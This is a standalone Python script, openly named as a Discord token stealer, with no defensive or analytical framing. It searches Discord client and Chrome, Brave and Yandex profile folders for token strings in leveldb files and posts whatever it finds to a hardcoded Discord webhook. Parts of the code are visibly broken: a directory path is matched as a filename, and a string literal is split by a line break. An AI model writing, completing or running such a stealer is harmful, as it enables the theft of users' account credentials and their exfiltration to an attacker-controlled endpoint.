
import os
import requests

def steal_discord_token():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    paths = [
        os.path.join(roaming, "Discord"),
        os.path.join(roaming, "discordcanary"),
        os.path.join(roaming, "discordptb"),
        os.path.join(local, "Google", "Chrome", "User Data", "Default"),
        os.path.join(local, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
        os.path.join(local, "Yandex", "YandexBrowser", "User Data", "Default")
    ]

    tokens = []
    for path in paths:
        if os.path.exists(path):
            for root, _, files in os.walk(path):
                for file in files:
                    if file == 'Local Storage\leveldb':
                        for filename in os.listdir(os.path.join(root, file)):
                            if filename.endswith('.log') or filename.endswith('.ldb'):
                                with open(os.path.join(root, file, filename), 'r', errors='ignore') as f:
                                    for line in f:
                                        if 'oken' in line:
                                            tokens.extend(line.split())

    if tokens:
        send_to_webhook(tokens)

def send_to_webhook(tokens):
    webhook_url = "https://discord.com/api/webhooks/1256430589154693243/zK2qjNJR3SeACWjhc8aKBPscdXjvG0NfoTOJEx3cFMWNKUhPxkrzEpcW7kBfSh_Edp5Z"
    data = {"content": "
".join(tokens)}
    requests.post(webhook_url, json=data)

def main():
    steal_discord_token()

if __name__ == "__main__":
    main()
    